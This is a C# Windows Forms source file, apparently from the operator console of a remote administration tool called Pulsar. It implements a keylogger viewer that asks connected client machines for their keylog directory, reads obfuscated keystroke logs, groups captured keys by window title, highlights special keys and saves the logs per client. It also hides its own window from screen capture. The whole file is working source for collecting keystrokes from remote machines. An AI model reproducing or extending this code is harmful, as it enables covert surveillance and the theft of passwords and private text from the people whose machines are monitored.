using Pulsar.Common.Helpers;
using Pulsar.Common.Messages;
using Pulsar.Common.Messages.Monitoring.KeyLogger;
using Pulsar.Server.Forms.DarkMode;
using Pulsar.Server.Helper;
using Pulsar.Server.Messages;
using Pulsar.Server.Networking;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Pulsar.Server.Forms
{
    public partial class FrmKeylogger : Form
    {
        private readonly Client _connectClient;
        private readonly KeyloggerHandler _keyloggerHandler;
        private static readonly Dictionary<Client, FrmKeylogger> OpenedForms = new Dictionary<Client, FrmKeylogger>();

        private readonly Timer autoRefreshTimer = new Timer();
        private StringBuilder currentLogCache = new StringBuilder();
        private readonly object _contentLock = new object();
        private DateTime _lastRefreshTime = DateTime.MinValue;
        private readonly TimeSpan _minimumRefreshInterval = TimeSpan.FromMilliseconds(1000);
        private FileSystemWatcher _fileWatcher;
        private string _currentWatchedFile;

        public static FrmKeylogger CreateNewOrGetExisting(Client client)
        {
            if (OpenedForms.TryGetValue(client, out var existingForm))
                return existingForm;

            var form = new FrmKeylogger(client);
            form.Disposed += (s, e) => OpenedForms.Remove(client);
            OpenedForms.Add(client, form);
            return form;
        }

        public FrmKeylogger(Client client)
        {
            _connectClient = client ?? throw new ArgumentNullException(nameof(client));
            _keyloggerHandler = new KeyloggerHandler(client);

            InitializeComponent();
            DarkModeManager.ApplyDarkMode(this);
            ScreenCaptureHider.ScreenCaptureHider.Apply(this.Handle);

            RegisterMessageHandler();

            // Refresh interval synchronized with keylogger flush (2s)
            autoRefreshTimer.Interval = 2000;
            autoRefreshTimer.Tick += AutoRefreshTimer_Tick;

            InitializeFileWatcher();
        }

        private void InitializeFileWatcher()
        {
            _fileWatcher = new FileSystemWatcher
            {
                Path = Path.GetTempPath(),
                Filter = "*.txt",
                NotifyFilter = NotifyFilters.LastWrite | NotifyFilters.Size,
                EnableRaisingEvents = false
            };
            _fileWatcher.Changed += FileWatcher_Changed;
        }

        private void FileWatcher_Changed(object sender, FileSystemEventArgs e)
        {
            if (e.ChangeType == WatcherChangeTypes.Changed &&
                e.FullPath == _currentWatchedFile)
            {
                System.Threading.Thread.Sleep(50); // wait for write completion
                SafeInvoke(() => RefreshSelectedLog());
            }
        }

        private void AutoRefreshTimer_Tick(object sender, EventArgs e)
        {
            if ((DateTime.UtcNow - _lastRefreshTime) < _minimumRefreshInterval)
                return;

            _lastRefreshTime = DateTime.UtcNow;

            if (checkBox1.Checked && lstLogs.SelectedItems.Count > 0)
                RefreshSelectedLog();
        }

        private void RegisterMessageHandler()
        {
            _connectClient.ClientState += ClientDisconnected;
            _keyloggerHandler.ProgressChanged += LogsChanged;
            MessageHandler.Register(_keyloggerHandler);
        }

        private void UnregisterMessageHandler()
        {
            MessageHandler.Unregister(_keyloggerHandler);
            _keyloggerHandler.ProgressChanged -= LogsChanged;
            _connectClient.ClientState -= ClientDisconnected;
        }

        private void ClientDisconnected(Client client, bool connected)
        {
            if (!connected)
                SafeInvoke(Close);
        }

        private void LogsChanged(object sender, string message)
        {
            SafeInvoke(RefreshLogsDirectory);
        }

        private void FrmKeylogger_Load(object sender, EventArgs e)
        {
            Text = WindowHelper.GetWindowTitle("Keylogger", _connectClient);
            RefreshLogsDirectory();

            if (lstLogs.Items.Count > 0)
            {
                lstLogs.Items[0].Selected = true;
                lstLogs.Focus();
                UpdateFileWatcher();
                RefreshSelectedLog();
            }
        }

        private void FrmKeylogger_FormClosing(object sender, FormClosingEventArgs e)
        {
            UnregisterMessageHandler();
            _keyloggerHandler.Dispose();
            _fileWatcher?.Dispose();
            autoRefreshTimer.Stop();
            autoRefreshTimer.Dispose();
        }

        private void lstLogs_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (lstLogs.SelectedItems.Count > 0)
            {
                UpdateFileWatcher();
                RefreshSelectedLog();
            }
        }

        private void lstLogs_ItemActivate(object sender, EventArgs e)
        {
            RefreshSelectedLog();
        }

        private void UpdateFileWatcher()
        {
            if (lstLogs.SelectedItems.Count > 0)
            {
                _currentWatchedFile = Path.Combine(Path.GetTempPath(), lstLogs.SelectedItems[0].Text);
                _fileWatcher.EnableRaisingEvents = checkBox1.Checked;
            }
            else
                _fileWatcher.EnableRaisingEvents = false;
        }

        private void RefreshLogsDirectory()
        {
            SafeInvoke(() =>
            {
                string previous = lstLogs.SelectedItems.Count > 0 ? lstLogs.SelectedItems[0].Text : null;
                lstLogs.Items.Clear();

                try
                {
                    var validPattern = new System.Text.RegularExpressions.Regex(@"^\d{4}-\d{2}-\d{2}(?:_\d{2})?\.txt$");
                    var files = new DirectoryInfo(Path.GetTempPath())
                        .GetFiles("*.txt")
                        .Where(f => validPattern.IsMatch(f.Name))
                        .OrderByDescending(f => f.LastWriteTime)
                        .ToList();

                    foreach (var f in files)
                        lstLogs.Items.Add(new ListViewItem(f.Name));

                    // restore previous selection
                    if (!string.IsNullOrEmpty(previous))
                    {
                        var item = lstLogs.Items.Cast<ListViewItem>().FirstOrDefault(i => i.Text == previous);
                        if (item != null)
                        {
                            item.Selected = true;
                            lstLogs.Focus();
                        }
                    }
                    else if (lstLogs.Items.Count > 0)
                    {
                        lstLogs.Items[0].Selected = true;
                        lstLogs.Focus();
                    }

                    UpdateFileWatcher();
                }
                catch (Exception ex)
                {
                    Debug.WriteLine($"Refresh logs error: {ex.Message}");
                }
            });
        }

        private void RefreshSelectedLog()
        {
            if (lstLogs.SelectedItems.Count == 0) return;

            string logFilePath = Path.Combine(Path.GetTempPath(), lstLogs.SelectedItems[0].Text);

            Task.Run(() =>
            {
                try
                {
                    if (!File.Exists(logFilePath))
                    {
                        SafeInvoke(() => rtbLogViewer.Text = "Log file not found.");
                        return;
                    }

                    string logContent = ReadFileWithRetry(logFilePath);
                    if (logContent == null) return;

                    // Deduplicate & merge broken lines
                    string filtered = FilterAndDeduplicateLog(logContent);
                    filtered = MergeBrokenLines(filtered);

                    lock (_contentLock)
                    {
                        if (filtered != currentLogCache.ToString())
                        {
                            currentLogCache.Clear();
                            currentLogCache.Append(filtered);

                            SafeInvoke(() =>
                            {
                                rtbLogViewer.Clear();
                                rtbLogViewer.Text = currentLogCache.ToString();
                                HighlightSpecialKeys();
                                rtbLogViewer.SelectionStart = rtbLogViewer.Text.Length;
                                rtbLogViewer.ScrollToCaret();
                            });
                        }
                    }
                }
                catch (Exception ex)
                {
                    SafeInvoke(() => rtbLogViewer.Text = $"Error loading log: {ex.Message}");
                }
            });
        }

        private string ReadFileWithRetry(string filePath, int maxRetries = 3)
        {
            for (int i = 0; i < maxRetries; i++)
            {
                try { return FileHelper.ReadObfuscatedLogFile(filePath); }
                catch (IOException) when (i < maxRetries - 1) { System.Threading.Thread.Sleep(50); }
            }
            return null;
        }

        private string FilterAndDeduplicateLog(string content)
        {
            if (string.IsNullOrEmpty(content)) return content;

            var lines = content.Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.None);
            var seen = new HashSet<string>();
            var result = new List<string>();

            foreach (var line in lines)
            {
                string trimmed = line.Trim();
                if (string.IsNullOrEmpty(trimmed)) continue;

                if (trimmed.StartsWith("Log created on") ||
                    trimmed.StartsWith("Session started at:") ||
                    trimmed.StartsWith("===")) continue;

                if (seen.Add(trimmed)) result.Add(trimmed);
            }

            return string.Join(Environment.NewLine, result);
        }

        // ------------------- MergeBrokenLines -------------------
        private string MergeBrokenLines(string content)
        {
            if (string.IsNullOrEmpty(content)) return content;

            var lines = content.Split(new[] { "\r\n", "\r", "\n" }, StringSplitOptions.None);
            var merged = new StringBuilder();
            string currentHeader = null;
            string currentWindow = null; // track the generalized window name
            StringBuilder textBuffer = new StringBuilder();

            foreach (var line in lines)
            {
                var trimmed = line.Trim();
                if (string.IsNullOrEmpty(trimmed)) continue;

                // Detect new window header (skip special keys)
                if (trimmed.StartsWith("[") && trimmed.Contains("]") &&
                    !trimmed.Contains("[Back]") && !trimmed.Contains("[Tab]") && !trimmed.Contains("[Esc]"))
                {
                    string processedHeader = trimmed;
                    string generalizedWindow = null;

                    // convert timestamp to server local time
                    try
                    {
                        var closeIdx = trimmed.IndexOf(']');
                        if (closeIdx > 2)
                        {
                            var timePart = trimmed.Substring(1, Math.Min(8, closeIdx - 1));
                            if (DateTime.TryParseExact(timePart, "HH:mm:ss", null,
                                System.Globalization.DateTimeStyles.None, out DateTime parsedTime))
                            {
                                DateTime local = DateTime.Today.Add(parsedTime.TimeOfDay);
                                string rest = closeIdx + 1 < trimmed.Length ? trimmed.Substring(closeIdx + 1) : string.Empty;

                                // Generalize window title if present
                                int dashIndex = rest.LastIndexOf('-');
                                if (dashIndex >= 0)
                                {
                                    generalizedWindow = rest.Substring(dashIndex).Trim();
                                    rest = " " + generalizedWindow; // keep only "- WindowName"
                                }

                                processedHeader = $"[{local:hh:mm:ss tt}]{rest}";
                            }
                        }
                    }
                    catch { }

                    // Only treat as new header if window changed
                    if (generalizedWindow != currentWindow)
                    {
                        if (currentHeader != null)
                        {
                            merged.AppendLine(currentHeader);
                            if (textBuffer.Length > 0)
                                merged.AppendLine(textBuffer.ToString());
                            textBuffer.Clear();
                        }

                        currentHeader = processedHeader;
                        currentWindow = generalizedWindow;
                    }
                }
                else
                {
                    if (textBuffer.Length > 0) textBuffer.Append(" ");
                    textBuffer.Append(trimmed);
                }
            }

            if (currentHeader != null)
            {
                merged.AppendLine(currentHeader);
                if (textBuffer.Length > 0) merged.AppendLine(textBuffer.ToString());
            }

            return merged.ToString();
        }

        private void HighlightSpecialKeys()
        {
            string text = rtbLogViewer.Text;

            // Highlight headers in lime green
            var headerRegex = new System.Text.RegularExpressions.Regex(
                @"^\[(\d{2}:\d{2}:\d{2} [AP]M)\].*$",
                System.Text.RegularExpressions.RegexOptions.Multiline);

            foreach (System.Text.RegularExpressions.Match match in headerRegex.Matches(text))
            {
                rtbLogViewer.Select(match.Index, match.Length);
                rtbLogViewer.SelectionColor = Color.LimeGreen;
            }

            // Special keys to highlight
            string[] specialKeys = {
        "Back", "Del", "Tab", "Esc", "Enter",
        "Up", "Down", "Left", "Right","LShift",
        "F1","F2","F3","F4","F5","F6","F7","F8","F9","F10","F11","F12",
        "F13","F14","F15","F16","F17","F18","F19","F20","F21","F22","F23","F24"
    };

            // Modifiers that can prefix special keys
            string[] modifiers = { "Shift", "Ctrl", "Alt" };

            // Regex pattern: match any number of modifiers + a special key
            // Examples: [Back], [Shift][Del], [Ctrl][Alt][F5]
            string pattern = @"(?:\[(?:" + string.Join("|", modifiers) + @")\])*" +
                             @"\[(?:" + string.Join("|", specialKeys) + @")\]";

            var specialKeyRegex = new System.Text.RegularExpressions.Regex(pattern);

            foreach (System.Text.RegularExpressions.Match match in specialKeyRegex.Matches(text))
            {
                // Skip if inside a header
                bool insideHeader = false;
                foreach (System.Text.RegularExpressions.Match headerMatch in headerRegex.Matches(text))
                {
                    if (match.Index >= headerMatch.Index && match.Index < headerMatch.Index + headerMatch.Length)
                    {
                        insideHeader = true;
                        break;
                    }
                }
                if (insideHeader) continue;

                rtbLogViewer.Select(match.Index, match.Length);
                rtbLogViewer.SelectionColor = Color.Gold;
            }

            // Reset selection
            rtbLogViewer.SelectionStart = rtbLogViewer.Text.Length;
            rtbLogViewer.SelectionColor = rtbLogViewer.ForeColor;
        }

        private void SafeInvoke(Action action)
        {
            if (InvokeRequired) Invoke(action);
            else action();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            _connectClient.Send(new GetKeyloggerLogsDirectory());
        }

        private void checkBox1_CheckedChanged_1(object sender, EventArgs e)
        {
            if (checkBox1.Checked)
            {
                RefreshLogsDirectory();

                if (lstLogs.Items.Count > 0)
                {
                    lstLogs.Items[0].Selected = true;
                    lstLogs.Focus();
                    UpdateFileWatcher();
                    RefreshSelectedLog();
                }

                autoRefreshTimer.Start();
                _fileWatcher.EnableRaisingEvents = true;
            }
            else
            {
                autoRefreshTimer.Stop();
                _fileWatcher.EnableRaisingEvents = false;
            }
        }

        private void btnGetLogs_Click(object sender, EventArgs e)
        {
            RefreshLogsDirectory();

            if (lstLogs.Items.Count > 0)
            {
                lstLogs.Items[0].Selected = true;
                lstLogs.Focus();
                UpdateFileWatcher();
                RefreshSelectedLog();
            }
        }

        private void button2_Click(object sender, EventArgs e)
        {
            try
            {
                if (currentLogCache.Length == 0)
                {
                    MessageBox.Show("No log to save.", "Info", MessageBoxButtons.OK, MessageBoxIcon.Information);
                    return;
                }

                string clientFolder = _connectClient.Value.DownloadDirectory;
                if (string.IsNullOrWhiteSpace(clientFolder))
                    clientFolder = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "Clients", "UnknownClient");

                string keylogFolder = Path.Combine(clientFolder, "Keylogs");
                if (!Directory.Exists(keylogFolder))
                    Directory.CreateDirectory(keylogFolder);

                string fileName = $"Keylog_{DateTime.Now:yyyy-MM-dd_HH-mm-ss}.txt";
                string savePath = Path.Combine(keylogFolder, fileName);

                File.WriteAllText(savePath, currentLogCache.ToString(), Encoding.UTF8);

                MessageBox.Show($"Log saved to {savePath}", "Saved", MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Failed to save log: {ex.Message}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }

        private void button3_Click(object sender, EventArgs e)
        {

        }
    }
}
